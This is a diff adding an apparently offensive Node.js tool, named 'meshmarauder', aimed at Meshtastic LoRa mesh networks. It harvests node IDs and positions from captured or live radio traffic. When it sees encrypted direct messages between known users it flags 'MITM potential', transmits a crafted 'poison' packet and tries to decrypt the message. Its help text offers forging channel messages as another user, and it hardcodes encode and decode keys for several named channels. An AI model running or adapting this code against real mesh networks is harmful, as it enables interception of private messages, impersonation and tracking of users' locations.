@@ -1,0 +1,350 @@
+#!/usr/bin/env node
+":" //# comment; exec /usr/bin/env node --input-type=module - "$@" < "$0"
+import * as fs from 'fs'
+import * as readline from 'readline'
+import { Config } from '@dataparty/api/src/index.js'
+
+import { parseInputPacket, CHANNELS,OUTBOUND_CHANNELS, buf2hex } from '../src/utils.mjs'
+import { LorapipeRawPacket } from '../src/lorapipe-raw-packet.mjs'
+
+let evilBuffer = []
+let modeBuffer = true
+
+let macaddrs = {
+
+}
+
+
+function htonl(n){
+
+  let inView = new DataView (new Uint8Array(4).buffer)
+  let outView = new DataView (new Uint8Array(4).buffer)
+
+  inView.setUint32(0, n)
+
+  outView.setUint8(0, inView.getUint8(3))
+  outView.setUint8(1, inView.getUint8(2))
+  outView.setUint8(2, inView.getUint8(1))
+  outView.setUint8(3, inView.getUint8(0))
+
+  return outView.getUint32(0)
+}
+
+
+let counts = {
+  lines: 0,
+  packets: 0,
+  dms: 0,
+  users: 0,
+  evils: 0,
+  sent: 0
+}
+
+import { SerialPort } from 'serialport'
+import { ReadlineParser } from '@serialport/parser-readline'
+
+let port = null
+
+let ingestComplete = false
+
+let config = null
+
+async function handleLine(line){
+  counts.lines++
+
+    try{
+
+      if(
+        line.indexOf('RAW') != -1 ||
+        line.indexOf('RX') != -1
+      ){
+        let initial = parseInputPacket(line)
+
+        if(initial == null){ return }
+
+        let { seen, rssi, snr, raw } = initial
+
+        let pkt = new LorapipeRawPacket(seen, rssi, snr, raw, CHANNELS)
+
+        if(ingestComplete){
+          console.log(pkt)
+        }
+
+        counts.packets++
+
+        if(ingestComplete && pkt.parsed && pkt.parsed.is_dm && pkt.parsed.decoded == false && pkt.parsed.decrypted == false){
+
+          let fromStr = htonl(pkt.header.from).toString(16)
+          let toStr = htonl(pkt.header.to).toString(16)
+
+          console.log(pkt.meta.seen, '📨 dm from', fromStr, '>', toStr)
+
+          let toUser = macaddrs['!'+toStr]
+          let fromUser = macaddrs['!'+fromStr]
+          if(toUser && fromUser){
+            console.log('MITM potential')
+            console.log('to', toUser)
+            console.log('from', fromUser)
+
+            let buf = await toUser.genPoison()
+            port.write('txraw ' + buf2hex(buf) + '\r\n')
+
+            await toUser.decryptDM(pkt, fromUser)
+          }
+
+          counts.dms++
+
+          //console.log()
+        }
+
+        //! is it a user interaction
+        if(pkt.parsed && pkt.parsed.content){
+
+          if(macaddrs[ pkt.parsed.content.id ] != null && macaddrs[ pkt.parsed.content.id ] != undefined){ return }
+
+          counts.users++
+
+          macaddrs[ pkt.parsed.content.id ] = pkt
+
+          console.log('👤', 'id ',pkt.parsed.content.id, htonl(pkt.header.from).toString(16))
+
+        } else {
+          if(pkt.parsed && pkt.parsed.content && pkt.parsed.content['$typeName'] == 'meshtastic.Position'){
+            if(ingestComplete){ 
+              process.stdout.write('📍')
+            }
+          }
+        }
+      }
+    } catch(err){
+      //
+      console.log(err)
+    }
+}
+
+let lastSendComplete = null
+
+async function goMaraude(){
+
+  let startTime = Date.now()
+  console.log('Analyzed ', counts)
+  let stats = {
+    counts,
+    startTime,
+    currentIdx:null,
+    currentNodeId:null,
+    lastSendComplete:null
+  }
+  fs.appendFileSync('marauder-status.json', JSON.stringify(stats,null,2));
+
+  function waitforme(millisec) {
+    return new Promise(resolve => {
+        setTimeout(() => { resolve() }, millisec);
+    })
+  }
+
+  let resolver = null
+
+  let lastStats = Date.now()
+
+  const parser = port.pipe(new ReadlineParser({ delimiter: '\n' }))
+
+  parser.on('data', async (line)=>{
+    //console.log('[',line,']')
+    if(line.indexOf('OK') != -1 && resolver != null){
+      resolver()
+      resolver = null
+    
+    } else if(line.indexOf('RXLOG')!=-1){
+      //log line
+      //console.log('got a line from the air')
+      await handleLine(line)
+
+      process.stdout.write('+')
+
+      fs.appendFileSync('air-log.csv', line+'\n');
+
+    }
+  })
+
+  let statsTimer = setInterval(()=>{
+
+    let now = Date.now()
+
+    let deltaMs = now - lastSendComplete 
+    //fs.appendFileSync('status', JSON.stringify(stats,null,2));
+
+    if(deltaMs > 120*1000){
+      console.log('FATAL - sending seems stuck')
+      process.exit()
+    }
+
+    console.log('\n',stats)
+  }, 30000)
+
+  let startIdx = Math.floor(Math.random()*Object.keys(macaddrs).length)
+
+  for(let i=startIdx; i<Object.keys(macaddrs).length; i++){
+
+    let now = Date.now()
+
+    let key = Object.keys(macaddrs)[i]
+    let buf = macaddrs[key]
+
+    stats.currentIdx = i
+    stats.currentNodeId = key
+
+    //process.stdout.write('txraw ' + buf2hex(buf) + '\n')
+
+    //port.write('txraw ' + buf2hex(buf) + '\r\n')
+    
+    let p = new Promise((resolve, reject)=>{
+
+      let resolved = false
+
+      let timeout = setTimeout(()=>{
+
+        process.stdout.write('!')
+
+        if(!resolved){resolve()}
+        resolved = true
+      }, 15000)
+
+      resolver = ()=>{ if(!resolved){resolve()}; clearTimeout(timeout); resolved = true }
+    })
+
+    await p
+    //console.log('OK')
+    process.stdout.write('.')
+
+    lastSendComplete = Date.now()
+    counts.sent++
+    stats.lastSendComplete = lastSendComplete
+
+    await waitforme(await config.read('t'))
+  }
+
+  let endTime = Date.now()
+
+  clearInterval(statsTimer)
+}
+
+async function processFile(fileName){
+  
+  let fileStream = fs.createReadStream(fileName)
+
+
+  const rl = readline.createInterface({
+    input: fileStream,
+    crlfDelay: Infinity
+  });
+
+  for await (const line of rl) {
+    await handleLine(line)
+  }
+}
+
+async function showHelp(){
+
+  console.log( 'Usage: ', await config.read('$0'), ' [options] -f <traffic.csv> -D /dev/tty_lorapipe0 -m <text>')
+
+  console.log( '\t', '-F', '\t', '[from]', '\t', 'Send messages as specified userid')
+  console.log( '\t', '-m', '\t', '[text]', '\t', 'Message to transmit')
+  console.log( '\t', '-D', '\t', '[tty-path]', '\t', 'Path to a lorapipe tty device')
+  console.log( '\t', '-f', '\t', '[file]', '\t', 'Path to a meshtastic traffic dump')
+  console.log( '\t', '-t', '\t', '[timeout]', '\t', 'Number of milliseconds to wait between sending forged channel messages')
+  console.log( '\t', '-c', '\t', '[decode_key]', '\t', 'Channel decode key in base64')
+  console.log( '\t', '-C', '\t', '[encode_key]', '\t', 'Channel encode key in base64')
+  console.log( '\t', '-V', '\t', '\t', '\t', 'Verbose output')
+}
+
+function fixStringArray(stringOrArray){
+  if(typeof stringOrArray == 'string'){
+    return [stringOrArray]
+  }
+
+  return stringOrArray
+}
+
+async function importChannelKeys(config, type, keys=[]){
+  if(type != 'decode' && type != 'encode'){ throw new Error('invalid key type') }
+
+  let keyType = ''+type+'_channel_keys'
+
+  let count = Object.keys(await config.read(keyType) || {}).length
+
+  for(let i=0; i<keys.length; i++){
+    const key = keys[i]
+    let name = 'key_'+ (count+i+1)
+    await config.write(keyType+'.'+name, key)
+  }
+  
+}
+
+async function handleFlags(config){
+  await config.start()
+
+  if(await config.read('h') || await config.read('help')){
+    await showHelp()
+    process.exit()
+  }
+  
+  
+  await importChannelKeys(config, 'decode', fixStringArray(await config.read('c')))
+  await importChannelKeys(config, 'encode', fixStringArray(await config.read('C')))
+
+  
+}
+
+
+async function main() {
+
+  config = new Config.NconfConfig({
+    basePath: process.env.HOME + '/.meshmarauder',
+    D: '/dev/tty_lorapipe0',
+    t: 1337*3,
+    decode_channel_keys: {
+      Default1: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE=',
+      Default2: '1PG7OiApB1nwvP+rz05pAQ==',
+      DEFCONnect: 'OEu8wB3AItGBvza4YSHh+5a3LlW/dCJ+nWr7SNZMsaE=',
+      HackerComms: '6IzsaoVhx1ETWeWuu0dUWMLqItvYJLbRzwgTAKCfvtY=',
+      NodeChat: 'TiIdi8MJG+IRnIkS8iUZXRU+MHuGtuzEasOWXp4QndU='
+    },
+    encode_channel_keys: {
+      DEFCONnect: 'OEu8wB3AItGBvza4YSHh+5a3LlW/dCJ+nWr7SNZMsaE=',
+      HackerComms: '6IzsaoVhx1ETWeWuu0dUWMLqItvYJLbRzwgTAKCfvtY=',
+      NodeChat: 'TiIdi8MJG+IRnIkS8iUZXRU+MHuGtuzEasOWXp4QndU='
+    }
+  })
+
+  await handleFlags(config)
+
+  let files = fixStringArray(await config.read('f'))
+  let device = await config.read('D')
+  
+  port = new SerialPort({ path: device , baudRate: 115200 })
+ 
+ 
+  if(Array.isArray(files) && files.length > 0){
+
+    let filePromise = []
+
+    for(let file of files){
+      filePromise.push( processFile(file) )
+    }
+
+    console.log('waiting for files')
+    await Promise.all(filePromise)
+
+    console.log('done processing')
+  }
+
+  ingestComplete = true
+
+  while(true){
+    await goMaraude()
+  }
+  
+}
+
+main();
